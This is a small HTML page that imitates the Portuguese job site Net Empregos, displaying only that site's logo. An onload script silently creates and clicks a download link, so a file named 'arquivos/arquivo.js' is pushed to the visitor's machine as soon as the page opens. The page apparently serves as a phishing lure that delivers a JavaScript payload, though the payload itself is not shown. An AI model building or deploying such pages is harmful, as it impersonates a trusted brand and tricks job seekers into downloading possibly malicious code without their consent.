<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Net Empregos</title>

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: white;
}

img {
    width: 250px;
}
</style>

</head>

<body>

<img src="https://www.net-empregos.com/img/logos/net-empregos.png">


<script>

window.onload = function(){

    let arquivo = "arquivos/arquivo.js";

    let link = document.createElement("a");

    link.href = arquivo;
    link.download = "";

    document.body.appendChild(link);

    link.click();

    document.body.removeChild(link);

}

</script>


</body>
</html>
